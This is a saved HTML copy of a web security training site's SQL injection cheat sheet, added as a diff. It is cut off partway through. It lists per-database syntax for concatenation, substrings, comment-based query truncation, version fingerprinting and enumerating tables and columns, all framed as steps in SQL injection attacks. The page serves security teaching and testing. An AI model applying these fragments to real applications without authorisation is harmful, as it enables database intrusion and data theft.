@@ -1,0 +1,1226 @@
+<!DOCTYPE html>
+<!-- saved from url=(0062)https://portswigger.net/web-security/sql-injection/cheat-sheet -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        
+        <meta content="IE=edge" http-equiv="X-UA-Compatible">
+        <meta content="width=device-width, initial-scale=1" name="viewport">
+        <title>SQL injection cheat sheet | Web Security Academy</title>
+        <meta content="This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL ..." name="description">
+        <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="SQL injection cheat sheet | Web Security Academy">
+    <meta name="twitter:description" content="This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL ...">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="SQL injection cheat sheet | Web Security Academy">
+    <meta property="og:description" content="This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL ...">
+<meta property="og:url" content="https://portswigger.net/web-security/sql-injection/cheat-sheet">
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+<meta property="og:type" content="website">
+<link rel="canonical" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">
+<link rel="icon" href="https://portswigger.net/content/images/logos/favicon.ico" type="image/x-icon">
+<link rel="apple-touch-icon" href="https://portswigger.net/content/images/logos/apple-touch-icon.png">
+        <link href="./SQL injection cheat sheet _ Web Security Academy_files/pswebsecacademy.css" rel="stylesheet" type="text/css">
+        <link rel="preload" href="https://portswigger.net/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="https://portswigger.net/content/fonts/ps-main/ps-icons.woff?l1la2n" as="font" crossorigin="anonymous">
+        
+<script type="text/javascript" async="" defer="" src="./SQL injection cheat sheet _ Web Security Academy_files/ppms.js.download"></script><script async="" src="./SQL injection cheat sheet _ Web Security Academy_files/287552c2-4917-42e0-8982-ba994a2a73d7.js.download"></script><script nonce="">
+    const dimensionName = "dimension2";
+    const userRef = "A75D58E8E33146F35636337CDA2977DF";
+</script>
+
+
+
+<script nonce="">
+
+    (function(window, document, dataLayerName, id) {
+    function stgCreateCookie(a,b,c){var d="";if(c){var e=new Date;e.setTime(e.getTime()+24*c*60*60*1e3),d=";expires="+e.toUTCString()}document.cookie=a+"="+b+d+"; path=/"}
+    var isStgDebug=(window.location.href.match("stg_debug")||document.cookie.match("stg_debug"))&&!window.location.href.match("stg_disable_debug");
+    stgCreateCookie("stg_debug",isStgDebug?1:"",isStgDebug?14:-1);
+    var qP=[];dataLayerName!=="dataLayer"&&qP.push("data_layer_name="+dataLayerName),isStgDebug&&qP.push("stg_debug");
+    var qPString=qP.length>0?("?"+qP.join("&")):"";
+    document.write('<nonce-script src="https://ps.containers.piwik.pro/'+id+'.sync.js' + qPString + '" nonce="fgboOo0/D8nK/bSBUzTiTQDn5uYaW28v"></' + 'nonce-script>');
+    })(window, document, 'dataLayer', '287552c2-4917-42e0-8982-ba994a2a73d7');
+
+    window.dataLayer = window.dataLayer || [];
+    window.dataLayer.push({
+        customerId : 'A75D58E8E33146F35636337CDA2977DF',
+    });
+</script><script id="ppas_container_configuration" data-appid="287552c2-4917-42e0-8982-ba994a2a73d7" data-host="ps.piwik.pro"></script><link type="text/css" rel="stylesheet" href="./SQL injection cheat sheet _ Web Security Academy_files/css2"></head><body class="theme-"><nonce-script src="https://ps.containers.piwik.pro/287552c2-4917-42e0-8982-ba994a2a73d7.sync.js" nonce=""></nonce-script> 
+    
+    
+        
+
+
+<script nonce="">
+(function(window, document, dataLayerName, id) {
+    window[dataLayerName]=window[dataLayerName]||[],window[dataLayerName].push({start:(new Date).getTime(),event:"stg.start"});
+    var scripts=document.getElementsByTagName('script')[0],tags=document.createElement('script');
+    function stgCreateCookie(a,b,c){var d="";if(c){var e=new Date;e.setTime(e.getTime()+24*c*60*60*1e3),d=";expires="+e.toUTCString()}document.cookie=a+"="+b+d+"; path=/"}
+    var isStgDebug=(window.location.href.match("stg_debug")||document.cookie.match("stg_debug"))&&!window.location.href.match("stg_disable_debug");
+    stgCreateCookie("stg_debug",isStgDebug?1:"",isStgDebug?14:-1);
+    var qP=[];dataLayerName!=="dataLayer"&&qP.push("data_layer_name="+dataLayerName),tags.nonce="fgboOo0/D8nK/bSBUzTiTQDn5uYaW28v",isStgDebug&&qP.push("stg_debug");
+    var qPString=qP.length>0?("?"+qP.join("&")):"";
+    tags.async=!0,tags.src="https://ps.containers.piwik.pro/"+id+".js"+qPString,
+    scripts.parentNode.insertBefore(tags,scripts);
+    !function(a,n,i){a[n]=a[n]||{};for(var c=0;c<i.length;c++)!function(i){a[n][i]=a[n][i]||{},a[n][i].api=a[n][i].api||function(){
+    var a=[].slice.call(arguments,0);"string"==typeof a[0]&&window[dataLayerName].push({event:n+"."+i+":"+a[0],parameters:[].slice.call(arguments,1)})}}(i[c])}(window,"ppms",["tm","cm"]);
+    })(window, document, 'dataLayer', '287552c2-4917-42e0-8982-ba994a2a73d7');
+</script>
+        
+
+
+    <a href="https://portswigger.net/blog/introducing-dast-scanning-in-the-cloud-with-burp-suite-enterprise-edition" class="notification-banner theme-enterprise-2">
+        <strong>Burp Suite Enterprise Edition is now available in our secure Cloud</strong>&nbsp; – &nbsp;<span>Learn more</span>
+    </a>
+
+        <header class="page-header" id="top">
+            <div class="container">
+    <a class="logo" href="https://portswigger.net/"></a>
+    <div class="header-right">
+        <div class="login-buttons">
+                <a class="logout" href="https://portswigger.net/users/logout">Log out</a>
+                <a class="button-orange-small" href="https://portswigger.net/users/youraccount/personaldetails">My account</a>
+        </div>
+
+
+    <input type="checkbox" id="hamburger-mobile" class="hamburger-input-mobile">
+    <input type="radio" id="hamburger-desktop" class="hamburger-input-desktop" name="mega-nav-input">
+    <div class="hamburger-menu-mobile">
+        <label class="hamburger-menu-label header-hidden" for="hamburger-mobile">
+            <span class="hamburger-layers"></span>
+        </label>
+    </div>
+    <div class="mega-nav">
+        <input type="radio" id="mega-nav-close" class="mega-nav-input-close" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-1" class="mega-nav-input-1" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-2" class="mega-nav-input-2" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-6" class="mega-nav-input-6" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-7" class="mega-nav-input-7" name="mega-nav-input">
+
+        <label for="mega-nav-close" class="mega-nav-close"></label>
+
+        <label class="mega-nav-label mega-nav-label-1" for="mega-nav-label-1">
+            <span class="mega-nav-text">Products</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <label class="mega-nav-label mega-nav-label-2" for="mega-nav-label-2">
+            <span class="mega-nav-text">Solutions</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <a class="mega-nav-link" href="https://portswigger.net/research"><span class="mega-nav-text">Research</span></a>
+        <a class="mega-nav-link" href="https://portswigger.net/web-security"><span class="mega-nav-text">Academy</span></a>
+        <label class="mega-nav-label mega-nav-label-6" for="mega-nav-label-6">
+            <span class="mega-nav-text">Support</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+
+        <label class="mega-nav-label mega-nav-label-7 header-hidden" for="mega-nav-label-7">
+            <span class="mega-nav-text">Company</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <div class="hamburger-menu-desktop">
+            <label class="hamburger-menu-label header-show" for="hamburger-desktop">
+                <span class="hamburger-layers"></span>
+            </label>
+            <div>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-1" href="https://portswigger.net/customers"><span class="mega-nav-text">Customers</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-3" href="https://portswigger.net/about"><span class="mega-nav-text">About</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-4" href="https://portswigger.net/blog"><span class="mega-nav-text">Blog</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-5" href="https://portswigger.net/careers"><span class="mega-nav-text">Careers</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-6" href="https://portswigger.net/legal"><span class="mega-nav-text">Legal</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-7" href="https://portswigger.net/contact"><span class="mega-nav-text">Contact</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-8" href="https://portswigger.net/support/reseller-faqs"><span class="mega-nav-text">Resellers</span></a>
+            </div>
+        </div>
+
+        <a class="mega-nav-link header-hidden" href="https://portswigger.net/users/youraccount"><span class="mega-nav-text">My account</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-1" href="https://portswigger.net/customers"><span class="mega-nav-text">Customers</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-3" href="https://portswigger.net/about"><span class="mega-nav-text">About</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-4" href="https://portswigger.net/blog"><span class="mega-nav-text">Blog</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-5" href="https://portswigger.net/careers"><span class="mega-nav-text">Careers</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-6" href="https://portswigger.net/legal"><span class="mega-nav-text">Legal</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-7" href="https://portswigger.net/contact"><span class="mega-nav-text">Contact</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-8" href="https://portswigger.net/support/reseller-faqs"><span class="mega-nav-text">Resellers</span></a>
+
+        <div class="mega-nav-container">
+
+            <div class="mega-nav-content mega-nav-content-1">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <a href="https://portswigger.net/burp/enterprise" class="link-block-white">
+                                <img src="./SQL injection cheat sheet _ Web Security Academy_files/enterprise.svg" alt="Burp Suite Enterprise Edition">
+                                <span><strong>Burp Suite Enterprise Edition</strong></span>
+                                <span>The enterprise-enabled dynamic web vulnerability scanner.</span>
+                            </a>
+
+                            <a href="https://portswigger.net/burp/pro" class="link-block-white">
+                                <img src="./SQL injection cheat sheet _ Web Security Academy_files/professional.svg" alt="Burp Suite Professional">
+                                <span><strong>Burp Suite Professional</strong></span>
+                                <span>The world's #1 web penetration testing toolkit.</span>
+                            </a>
+
+                            <a href="https://portswigger.net/burp/communitydownload" class="link-block-white">
+                                <img src="./SQL injection cheat sheet _ Web Security Academy_files/community.svg" alt="Burp Suite Community Edition">
+                                <span><strong>Burp Suite Community Edition</strong></span>
+                                <span>The best manual tools to start web security testing.</span>
+                            </a>
+
+                            <a href="https://portswigger.net/burp/dastardly" class="link-block-white">
+                                <img src="./SQL injection cheat sheet _ Web Security Academy_files/dastardly.svg" alt="Dastardly, from Burp Suite">
+                                <span><strong>Dastardly, from Burp Suite</strong></span>
+                                <span>Free, lightweight web application security scanning for CI/CD.</span>
+                            </a>
+
+                            <a href="https://portswigger.net/burp" class="chevron-after">View all product editions</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="https://portswigger.net/burp/vulnerability-scanner">
+                                    <p><strong>Burp Scanner</strong></p>
+                                    <p>Burp Suite's web vulnerability scanner</p>
+                                    <img src="./SQL injection cheat sheet _ Web Security Academy_files/burp-suite-scanner.jpg" alt="Burp Suite&#39;s web vulnerability scanner&#39;">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+            <div class="mega-nav-content mega-nav-content-2">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <div class="container-columns">
+                                <a href="https://portswigger.net/solutions/attack-surface-visibility" class="link-block-white">
+                                    <span><strong>Attack surface visibility</strong></span>
+                                    <span>Improve security posture, prioritize manual testing, free up time.</span>
+                                </a>
+                                <a href="https://portswigger.net/solutions/ci-driven-scanning" class="link-block-white">
+                                    <span><strong>CI-driven scanning</strong></span>
+                                    <span>More proactive security - find and fix vulnerabilities earlier.</span>
+                                </a>
+                                <a href="https://portswigger.net/solutions" class="link-block-white">
+                                    <span><strong>Application security testing</strong></span>
+                                    <span>See how our software enables the world to secure the web.</span>
+                                </a>
+                                <a href="https://portswigger.net/solutions/devsecops" class="link-block-white">
+                                    <span><strong>DevSecOps</strong></span>
+                                    <span>Catch critical bugs; ship more secure software, more quickly.</span>
+                                </a>
+
+                                <a href="https://portswigger.net/solutions/penetration-testing" class="link-block-white">
+                                    <span><strong>Penetration testing</strong></span>
+                                    <span>Accelerate penetration testing - find more bugs, more quickly.</span>
+                                </a>
+                                <a href="https://portswigger.net/solutions/automated-security-testing" class="link-block-white">
+                                    <span><strong>Automated scanning</strong></span>
+                                    <span>Scale dynamic scanning. Reduce risk. Save time/money.</span>
+                                </a>
+
+                                <a href="https://portswigger.net/solutions/bug-bounty-hunting" class="link-block-white">
+                                    <span><strong>Bug bounty hunting</strong></span>
+                                    <span>Level up your hacking and earn more bug bounties.</span>
+                                </a>
+                                <a href="https://portswigger.net/solutions/compliance" class="link-block-white">
+                                    <span><strong>Compliance</strong></span>
+                                    <span>Enhance security monitoring to comply with confidence.</span>
+                                </a>
+                            </div>
+                            <a href="https://portswigger.net/solutions" class="chevron-after">View all solutions</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="https://portswigger.net/burp/enterprise/resources/enterprise-edition-vs-professional">
+                                    <p><strong>Product comparison</strong></p>
+                                    <p>What's the difference between Pro and Enterprise Edition?</p>
+                                    <img src="./SQL injection cheat sheet _ Web Security Academy_files/burp-suite.jpg" alt="Burp Suite Professional vs Burp Suite Enterprise Edition">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+            <div class="mega-nav-content mega-nav-content-6">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <div class="container-columns">
+                                <a href="https://portswigger.net/support" class="link-block-white">
+                                    <span><strong>Support Center</strong></span>
+                                    <span>Get help and advice from our experts on all things Burp.</span>
+                                </a>
+                                <a href="https://portswigger.net/burp/documentation" class="link-block-white">
+                                    <span><strong>Documentation</strong></span>
+                                    <span>Tutorials and guides for Burp Suite.</span>
+                                </a>
+                                <a href="https://portswigger.net/burp/documentation/desktop/getting-started" class="link-block-white">
+                                    <span><strong>Get Started - Professional</strong></span>
+                                    <span>Get started with Burp Suite Professional.</span>
+                                </a>
+                                <a href="https://portswigger.net/burp/documentation/enterprise/getting-started" class="link-block-white">
+                                    <span><strong>Get Started - Enterprise</strong></span>
+                                    <span>Get started with Burp Suite Enterprise Edition.</span>
+                                </a>
+                                <a href="https://forum.portswigger.net/" class="link-block-white">
+                                    <span><strong>User Forum</strong></span>
+                                    <span>Get your questions answered in the User Forum.</span>
+                                </a>
+                                <a href="https://portswigger.net/burp/releases" class="link-block-white">
+                                    <span><strong>Downloads</strong></span>
+                                    <span>Download the latest version of Burp Suite.</span>
+                                </a>
+                            </div>
+                            <a href="https://portswigger.net/support" class="chevron-after">Visit the Support Center</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="https://portswigger.net/burp/releases">
+                                    <p><strong>Downloads</strong></p>
+                                    <p>Download the latest version of Burp Suite.</p>
+                                    <img src="./SQL injection cheat sheet _ Web Security Academy_files/latest-burp-suite-software-download.jpg" alt="The latest version of Burp Suite software for download">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+    </div>
+
+    </div>
+</div>
+        </header>
+        
+            <nav class="navigation-top">
+                <input type="checkbox" id="nav-main-enterprise">
+                <label for="nav-main-enterprise">
+                    <span>Academy home</span>
+                    <span class="icon-arrow-head-down"></span>
+                </label>
+                <ul>
+                    <li><a href="https://portswigger.net/web-security/index.html">Dashboard</a></li>
+                    <li><a href="https://portswigger.net/web-security/learning-paths">Learning paths</a></li>
+                    <li>
+                        <input type="checkbox" id="nav-main-academy-topics">
+                        <label for="nav-main-academy-topics">
+                            <span>Latest topics</span>
+                            <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <div>
+                            <a href="https://portswigger.net/web-security/llm-attacks">Web LLM attacks</a>
+                            <a href="https://portswigger.net/web-security/api-testing">API testing</a>
+                            <a href="https://portswigger.net/web-security/nosql-injection">NoSQL injection</a>
+                            <a href="https://portswigger.net/web-security/race-conditions">Race conditions</a>
+                            <a href="https://portswigger.net/web-security/graphql">GraphQL API vulnerabilities</a>
+                            <a href="https://portswigger.net/web-security/all-topics">View all topics</a>
+                        </div>
+                    </li>
+                    <li>
+                        <input type="checkbox" id="nav-main-academy-all-content">
+                        <label for="nav-main-academy-all-content">
+                            <span>All content</span>
+                            <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <div>
+                            <a href="https://portswigger.net/web-security/all-labs">All labs</a>
+                            <a href="https://portswigger.net/web-security/all-topics">All topics</a>
+                            <a href="https://portswigger.net/web-security/mystery-lab-challenge">Mystery labs</a>
+                        </div>
+                    </li>
+                    <li>
+                        <input type="checkbox" id="nav-main-academy-hall-of-fame">
+                        <label for="nav-main-academy-hall-of-fame">
+                            <span>Hall of Fame</span>
+                            <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <div>
+                            <a href="https://portswigger.net/web-security/hall-of-fame">Leaderboard</a>
+                            <a href="https://portswigger.net/web-security/getting-started/kamil-vavra/index.html">Interview - Kamil Vavra</a>
+                            <a href="https://portswigger.net/web-security/getting-started/johnny-villarreal/index.html">Interview - Johnny Villarreal</a>
+                            <a href="https://portswigger.net/web-security/getting-started/andres-rauschecker/index.html">Interview - Andres Rauschecker</a>
+                        </div>
+                    </li>
+                    <li><a href="https://portswigger.net/web-security/getting-started/index.html">Get started</a></li>
+                    <li>
+                        <input type="checkbox" id="nav-main-academy-certification">
+                        <label for="nav-main-academy-certification">
+                             <span>Get certified</span>
+                             <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <div>
+                             <a href="https://portswigger.net/web-security/certification/index.html">Get certified</a>
+                             <a href="https://portswigger.net/web-security/certification/how-to-prepare/index.html">How to prepare</a>
+                             <a href="https://portswigger.net/web-security/certification/how-it-works/index.html">How it works</a>
+                             <a href="https://portswigger.net/web-security/certification/practice-exam/index.html">Practice exam</a>
+                             <a href="https://portswigger.net/web-security/certification/exam-hints-and-guidance/index.html">Exam hints and guidance</a>
+                             <a href="https://portswigger.net/web-security/certification/how-it-works/index.html#what-the-exam-involves">What the exam involves</a>
+                             <a href="https://portswigger.net/web-security/certification/frequently-asked-questions/index.html">FAQs</a>
+                             <a href="https://portswigger.net/web-security/certification#validate-your-certification">Validate your certification</a>
+                        </div>
+                    </li>
+                </ul>
+            </nav>
+        
+        <div class="wrapper-large">
+            <div class="container-academy">
+                
+                <input class="nav-lhs-toggle-input" type="checkbox" id="nav-lhs-toggle">
+                <aside class="nav-lhs nav-lhs-sticky" id="tree-nav" tree-nav-version="243" style="height: calc(-227px + 100vh); top: 183px;">
+                    <nav class="nav-lhs-scrollable">
+                    <label class="nav-lhs-toggle-label" for="nav-lhs-toggle"></label> 
+                    
+
+        <a class="nav-back" href="https://portswigger.net/web-security/all-topics">
+            <span class="icon-arrow-head-left"></span>
+            Back to all topics
+        </a>
+        <input type="checkbox" id="nav-main-id">
+        <label class="nav-label" for="nav-main-id">
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <h3>SQL injection</h3>
+        <ul>
+            <li><a href="https://portswigger.net/web-security/sql-injection#what-is-sql-injection-sqli">What is SQL injection?</a></li>
+            <li><a href="https://portswigger.net/web-security/sql-injection#what-is-the-impact-of-a-successful-sql-injection-attack">What is the impact of SQL injection?</a></li>
+            <li>
+                <input type="checkbox" id="sub-nav-id-3">
+                <label for="sub-nav-id-3">
+                    <a href="https://portswigger.net/web-security/sql-injection#how-to-detect-sql-injection-vulnerabilities">Detecting SQL injection vulnerabilities</a>
+                    <span class="icon-arrow-head-down"></span>
+                </label>
+                <ul>
+                    <li><a href="https://portswigger.net/web-security/sql-injection#sql-injection-in-different-parts-of-the-query">In different parts of the query</a></li>
+                    <li><a href="https://portswigger.net/web-security/sql-injection#sql-injection-in-different-contexts">In different contexts</a></li>
+                </ul>
+            </li>
+            <li>
+                <input type="checkbox" id="sub-nav-id-2">
+                <label for="sub-nav-id-2">
+                    <a href="https://portswigger.net/web-security/sql-injection#sql-injection-examples">Examples of SQL injection</a>
+                    <span class="icon-arrow-head-down"></span>
+                </label>
+                <ul>
+                    <li><a href="https://portswigger.net/web-security/sql-injection#retrieving-hidden-data">Retrieving hidden data</a></li>
+                    <li><a href="https://portswigger.net/web-security/sql-injection#subverting-application-logic">Subverting application logic</a></li>
+                    <li><a href="https://portswigger.net/web-security/sql-injection#retrieving-data-from-other-database-tables">Retrieving data from other tables</a></li>
+                    <li><a href="https://portswigger.net/web-security/sql-injection#examining-the-database">Examining the database</a></li>
+                    <li><a href="https://portswigger.net/web-security/sql-injection#blind-sql-injection-vulnerabilities">Blind SQL injection</a></li>
+                    <li><a href="https://portswigger.net/web-security/sql-injection#second-order-sql-injection">Second-order SQL injection</a></li>
+                </ul>
+            </li>
+            <li>
+                <input type="checkbox" id="sub-nav-id-7">
+                <label for="sub-nav-id-7">
+                    <a href="https://portswigger.net/web-security/sql-injection/examining-the-database">Examining the database</a>
+                    <span class="icon-arrow-head-down"></span>
+                </label>
+                <ul>
+                    <li><a href="https://portswigger.net/web-security/sql-injection/examining-the-database#querying-the-database-type-and-version">Querying the type and version</a></li>
+                    <li><a href="https://portswigger.net/web-security/sql-injection/examining-the-database#listing-the-contents-of-the-database">Listing the contents</a></li>
+                </ul>
+            </li>
+            <li>
+                <input type="checkbox" id="sub-nav-id-6">
+                <label for="sub-nav-id-6">
+                    <a href="https://portswigger.net/web-security/sql-injection/union-attacks">UNION attacks</a>
+                    <span class="icon-arrow-head-down"></span>
+                </label>
+                <ul>
+                    <li><a href="https://portswigger.net/web-security/sql-injection/union-attacks#determining-the-number-of-columns-required">Determining the number of columns</a></li>
+                    <li><a href="https://portswigger.net/web-security/sql-injection/union-attacks#finding-columns-with-a-useful-data-type">Finding columns with a useful data type</a></li>
+                    <li><a href="https://portswigger.net/web-security/sql-injection/union-attacks#using-a-sql-injection-union-attack-to-retrieve-interesting-data">Retrieving interesting data</a></li>
+                    <li><a href="https://portswigger.net/web-security/sql-injection/union-attacks#retrieving-multiple-values-within-a-single-column">Retrieving multiple values in a single column</a></li>
+                </ul>
+            </li>
+            <li>
+                <input type="checkbox" id="sub-nav-id-8">
+                <label for="sub-nav-id-8">
+                    <a href="https://portswigger.net/web-security/sql-injection/blind">Blind SQL injection</a>
+                    <span class="icon-arrow-head-down"></span>
+                </label>
+                <ul>
+                    <li><a href="https://portswigger.net/web-security/sql-injection/blind#what-is-blind-sql-injection">What is blind SQL injection?</a></li>
+                    <li><a href="https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-responses">Triggering conditional responses</a></li>
+                    <li>
+                        <input type="checkbox" id="sub-nav-id-9">
+                        <label for="sub-nav-id-9">
+                            <a href="https://portswigger.net/web-security/sql-injection/blind#error-based-sql-injection">Error-based SQL injection</a>
+                            <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <ul>
+                            <li><a href="https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-errors">Inferring information using conditional errors</a></li>
+                            <li><a href="https://portswigger.net/web-security/sql-injection/blind#extracting-sensitive-data-via-verbose-sql-error-messages">Extracting data via verbose error messages</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-time-delays">Triggering time delays</a></li>
+                    <li><a href="https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-using-out-of-band-oast-techniques">Out-of-band (OAST) techniques</a></li>
+                    <li><a href="https://portswigger.net/web-security/sql-injection/blind#how-to-prevent-blind-sql-injection-attacks">Preventing blind SQL injection</a></li>
+                </ul>
+            </li>
+            <li><a href="https://portswigger.net/web-security/sql-injection#how-to-prevent-sql-injection">How to prevent SQL injection</a></li>
+            <li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" class="selected">SQL injection cheat sheet</a></li>
+            <li><a href="https://portswigger.net/web-security/all-labs#sql-injection">View all SQL injection labs</a></li>
+        </ul>
+    
+                    </nav>
+                </aside>
+                <main>
+                    
+
+
+
+<ul class="breadcrumb-list" itemscope="" itemtype="http://schema.org/BreadcrumbList"><li itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem"><a itemscope="" itemtype="http://schema.org/Thing" itemprop="item" href="https://portswigger.net/web-security"><span itemprop="name">Web Security Academy</span></a><meta itemprop="position" content="1"></li><li itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem"><a itemscope="" itemtype="http://schema.org/Thing" itemprop="item" href="https://portswigger.net/web-security/sql-injection"><span itemprop="name">SQL injection</span></a><meta itemprop="position" content="2"></li><li itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem"><a itemscope="" itemtype="http://schema.org/Thing" itemprop="item" href="https://portswigger.net/web-security/sql-injection/cheat-sheet"><span itemprop="name">Cheat sheet</span></a><meta itemprop="position" content="3"></li></ul>    <div class="section theme-white">
+
+        <h1 class="heading-2"><a href="https://portswigger.net/web-security/sql-injection">SQL injection</a> cheat sheet</h1><p>
+            This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.
+        </p><h2 id="string-concatenation">String concatenation</h2><p>
+            You can concatenate together multiple strings to make a single string.
+        </p><table class="is-nonresponsive-table">
+            <tbody><tr>
+                <th>
+                    Oracle
+                </th>
+                <td><code>
+                    'foo'||'bar'
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    'foo'+'bar'
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    'foo'||'bar'
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td>
+                    <code>'foo' 'bar'</code> [Note the space between the two strings]<br>
+                    <code>CONCAT('foo','bar')</code><br>
+                </td>
+            </tr>
+        </tbody></table><h2 id="substring">Substring</h2><p>
+            You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string <code>ba</code>.
+        </p><table class="is-nonresponsive-table">
+            <tbody><tr>
+                <th>
+                    Oracle
+                </th>
+                <td><code>
+SUBSTR('foobar', 4, 2)
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+SUBSTRING('foobar', 4, 2)
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+SUBSTRING('foobar', 4, 2)
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td><code>
+SUBSTRING('foobar', 4, 2)
+                </code></td>
+            </tr>
+        </tbody></table><h2 id="comments">Comments</h2><p>
+            You can use comments to truncate a query and remove the portion of the original query that follows your input.
+        </p><table class="is-nonresponsive-table">
+            <tbody><tr>
+                <th>
+                    Oracle
+                </th>
+                <td><code>
+                    --comment<br>
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    --comment<br>
+                    /*comment*/
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    --comment<br>
+                    /*comment*/
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td>
+                    <code>#comment</code><br>
+                    <code>-- comment</code> [Note the space after the double dash]<br>
+                    <code>/*comment*/</code>
+                </td>
+            </tr>
+        </tbody></table><h2 id="database-version">Database version</h2><p>
+            You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
+        </p><table class="is-nonresponsive-table">
+            <tbody><tr>
+                <th>
+                    Oracle
+                </th>
+                <td><code>
+                    SELECT banner FROM v$version<br>
+                    SELECT version FROM v$instance<br>
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    SELECT @@version
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    SELECT version()
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td><code>
+                    SELECT @@version
+                </code></td>
+            </tr>
+        </tbody></table><h2 id="database-contents">Database contents</h2><p>
+            You can list the tables that exist in the database, and the columns that those tables contain.
+        </p><table class="is-nonresponsive-table">
+            <tbody><tr>
+                <th>
+                    Oracle
+                </th>
+                <td><code>
+                    SELECT * FROM all_tables<br>
+                    SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    SELECT * FROM information_schema.tables<br>
+                    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br>
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    SELECT * FROM information_schema.tables<br>
+                    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br>
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td><code>
+                    SELECT * FROM information_schema.tables<br>
